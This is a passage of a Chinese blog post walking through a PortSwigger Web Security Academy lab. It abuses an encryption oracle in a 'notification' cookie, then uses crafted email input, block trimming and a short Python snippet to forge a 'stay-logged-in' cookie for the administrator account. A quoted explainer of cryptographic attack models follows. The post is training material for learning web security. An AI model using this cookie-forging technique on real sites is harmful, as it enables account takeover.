+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/post?postId=2</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a99002103d86c988419af8800e90068.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>notification=jUYPViaXrK%2bv25jVI4zHooaWhSYGYDgSjW3g3DGHxpH03LY%2bSlAO16cu4037CYxA; stay-logged-in=k%2fhROkc31%2fF5Uz9SeehfGRaYG%2bX1izvb4Nyt0XLSt5E%3d; session=OFwYHyFE1syExW3XDFAxCAZngZh4eHHs</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br></pre></td></tr></table></figure>
+
+<p>只要携带这个 <code>notification</code> Cookie，响应页面就会出现：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">header</span> <span class="attr">class</span>=<span class="string">&quot;notification-header&quot;</span>&gt;</span></span><br><span class="line">Invalid email address: testATgmail.com</span><br><span class="line"><span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试使用 <code>stay-logged-in</code> 的值替换 <code>notification</code> 字段，得到 <code>wiener:1741507092076</code>。</p>
+<p>同时，如果使用 <code>wiener:1741507092076</code> 作为 Email 地址，则得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jUYPViaXrK%2bv25jVI4zHorgHLf5rAjIMcmLWEg0YaV2eNF65seq%2fE1CjxFuzetr5</span><br></pre></td></tr></table></figure>
+
+<p>经过 URL 编码解码，再经过 Base64 解码，得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8D 46 0F 56 26 97 AC AF AF DB 98 D5 23 8C C7 A2</span><br><span class="line">B8 07 2D FE 6B 02 32 0C 72 62 D6 12 0D 18 69 5D</span><br><span class="line">9E 34 5E B9 B1 EA BF 13 50 A3 C4 5B B3 7A DA F9</span><br></pre></td></tr></table></figure>
+
+<p>这跟原始的 <code>stay-logged-in</code> 的值解码后不太一样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">93 F8 51 3A 47 37 D7 F1 79 53 3F 52 79 E8 5F 19</span><br><span class="line">16 98 1B E5 F5 8B 3B DB E0 DC AD D1 72 D2 B7 91</span><br></pre></td></tr></table></figure>
+
+<p>如果使用 <code>notification=jUYPViaXrK%2bv25jVI4zHorgHLf5rAjIMcmLWEg0YaV2eNF65seq%2fE1CjxFuzetr5</code> 访问页面，得到 <code> Invalid email address: wiener:1741507092076</code>，说明在生成 <code>notification</code> 时，明文内容可能添加了 <code>Invalid email address: </code> 这个字符串。</p>
+<p>加解密内容看起来是 16 字节对齐的，如果进行如下操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8D 46 0F 56 26 97 AC AF AF DB 98 D5 23 8C C7 A2 // 删除这一行</span><br><span class="line">B8 07 2D FE 6B 02 32 0C 72 62 D6 12 0D 18 69 5D // 后两行 HEX Decode + Base64 Encode</span><br><span class="line">9E 34 5E B9 B1 EA BF 13 50 A3 C4 5B B3 7A DA F9 // 得到 uAct/msCMgxyYtYSDRhpXZ40Xrmx6r8TUKPEW7N62vk=</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>notification=uAct/msCMgxyYtYSDRhpXZ40Xrmx6r8TUKPEW7N62vk=</code> 访问页面，得到 <code>dress: wiener:1741507092076</code>。这里 <code>Invalid email ad</code> 刚好 <code>16</code> 字节，所以，我们可以构造如下 Email 地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invalid email address: 456789012administrator:1741507092076</span><br><span class="line">12345678901234567890123^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>456789012administrator:1741507092076</code> 作为 Email 地址评论文章，得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jUYPViaXrK%2bv25jVI4zHov%2bxa0JpLwMiozj4Q4rYDLWvfxCiVaNnhUkhMxL%2bpCtRnjReubHqvxNQo8Rbs3ra%2bQ%3d%3d</span><br></pre></td></tr></table></figure>
+
+<p>使用 Python 切割：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">&#x27;jUYPViaXrK%2bv25jVI4zHov%2bxa0JpLwMiozj4Q4rYDLWvfxCiVaNnhUkhMxL%2bpCtRnjReubHqvxNQo8Rbs3ra%2bQ%3d%3d&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = urllib.parse.unquote(s)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(base64.b64decode(url)[<span class="number">32</span>:])</span><br><span class="line"><span class="string">b&#x27;r38QolWjZ4VJITMS/qQrUZ40Xrmx6r8TUKPEW7N62vk=&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>stay-logged-in=r38QolWjZ4VJITMS/qQrUZ40Xrmx6r8TUKPEW7N62vk=</code> 即可登录 administrator 账号。</p>
+<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03. 小结"></a>0x03. 小结</h2><ul>
+<li>使用 Burp Intruder 重复发送 HTTP Request</li>
+<li>简单的 Encryption Oracle 应用</li>
+</ul>
+<h2 id="0x04-Attack-models-in-cryptography"><a href="#0x04-Attack-models-in-cryptography" class="headerlink" title="0x04. Attack models in cryptography"></a>0x04. Attack models in cryptography</h2><p>原文来自 <a target="_blank" rel="noopener" href="https://xianmu.github.io/posts/2017-06-30-attack-models-in-cryptography.html">Attack models in cryptography</a>，我觉得写的简单明了，复制过来存档：</p>
+<blockquote>
+<p>现代密码学的一个重要原则被称为Kerckhoff’s principle，要求密码系统的安全性不能依赖于算法的保密性，而只能依赖于密钥的保密性。由此，密码学算法对攻击者总是已知的。</p>
+<p>在此之上，根据攻击者能够获取的不同明密文信息将其攻击能力分为几个模型。能力由弱到强有唯密文攻击，已知明文攻击，选择明文攻击，选择密文攻击等模型。以下结合具体实例介绍这样几个攻击模型。</p>
+<p>另一方面，攻击者的目标其实也可以分为两种，一是破解密钥；二是获取某一特定密文的明文。显然后者的难度不会高于前者。</p>
+<p><strong>1 唯密文攻击</strong></p>
+<p>唯密文攻击(Ciphertext-only Attack-COA)，即攻击者只获得了若干密文，而没有任何的明文信息。这是最强的一种假设，即攻击者能力最弱，当然也是最低安全性要求。要实施这种攻击也很简单，只要监听信道就可以抓取密文信息了。</p>
+<p><strong>2 已知明文攻击</strong></p>
+<p>已知明文攻击(Known-Plaintext Attack-KPA)，指攻击者有若干明密文对，在此基础上进行密钥破解或者明文推测。现实中如何获取明密文对呢，很多协议开头有magic number或者类似的标识信息，这些协议的内容加密后显然就是这些magic number或者标识信息对应的密文。</p>
+<p><strong>3 选择明文攻击</strong></p>
+<p>选择明文攻击(Chosen-Plaintext Attack-CPA)，指攻击者占据加密机(encryption oracle)，从而可以构造任意明文并用加密机得到其密文，据此进行密钥破解或者明文推测。此处加密机应当理解为内含加密密钥和加密算法的一个黑盒，攻击者不能从中取出密钥，但是可以输入任意明文由该黑盒吐出用密钥加密后的密文。</p>
+<p>选择明文攻击的经典例子来自二战。日军在珊瑚海战后即将中途岛确定为下一个攻击目标，美海军情报局由于破译了日军部分密码，了解到了这一计划，但是具体攻击目标未能成功破译(日军密电中称为’AF’)，综合其他因素推断也不能明确，一部分人认为是中途岛，另一部分人则认为是阿留申群岛。后来，美军想到一个绝妙的主意，他们通过无线电向珍珠港报告，说中途岛上的海水净化装置故障导致岛上缺水，不久从日军截获的密电中即出现了’AF’缺水的内容，从而明确了日军目标即中途岛。</p>
+<p><strong>4 选择密文攻击</strong></p>
+<p>选择密文攻击(Chosen-Ciphertext Attack-CCA)，指攻击者能实施选择明文攻击，即能够得到任意明文对应的密文的情况下，还占据解密机(decryption oracle)从而可以构造任意密文并使用解密机解密得到其明文，据此进行密钥破解或者明文推测，当然这里要排除攻击者期望攻击的密文。与选择明文攻击类似，这里所谓占据解密机，也是指攻击者能够在不知道密钥的情况下构造任意的密文获得其明文。</p>
+<p>根据攻击者能够构造密文的阶段不同，CCA又可进一步分为CCA1(Non-adaptive CCA)，CCA2(Adaptive CCA)两个模型。二者的差别在于，在CCA1中，攻击者一次性将构造好的一组密文输入解密机得到它们对应的明文；而在CCA2中，攻击者可以在前一个密文解密得到的明文基础上构造后续要解密的密文。</p>
+<p>一个实际的CCA2攻击的例子是针对PKCS#1 random padding的Bleichenbacher攻击。</p>
+</blockquote>
+<h2 id="0x05-参考文档"><a href="#0x05-参考文档" class="headerlink" title="0x05. 参考文档"></a>0x05. 参考文档</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs#sql-injection">https://portswigger.net/web-security/all-labs#sql-injection</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></li>
+<li><a target="_blank" rel="noopener" href="https://xianmu.github.io/posts/2017-06-30-attack-models-in-cryptography.html">https://xianmu.github.io/posts/2017-06-30-attack-models-in-cryptography.html</a></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Logic-Vulnerability/" rel="tag"># Logic Vulnerability</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/03/08/burp-web-academy-sql-injection-part2/" rel="prev" title="Burp Web Academy SQL 注入（二）">
+                  <i class="fa fa-angle-left"></i> Burp Web Academy SQL 注入（二）
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Livermore</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
